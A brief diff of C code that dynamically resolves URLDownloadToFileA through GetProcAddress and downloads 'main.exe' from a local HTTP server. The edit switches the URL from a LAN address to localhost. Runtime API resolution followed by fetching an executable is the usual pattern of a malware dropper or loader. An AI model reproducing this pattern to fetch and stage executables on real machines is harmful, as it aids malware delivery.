@@ -460,7 +460,7 @@ int main(int argc, char** argv)
   	MY function_ptr = (MY)GetProcAddress(hurlmod, "URLDownloadToFileA");
   	function_ptr(
   		NULL,
-  		"http://192.168.1.190:8000/main.exe",		
+  		"http://localhost:8000/main.exe",		
   		"main.exe",				
   		0,
   		NULL
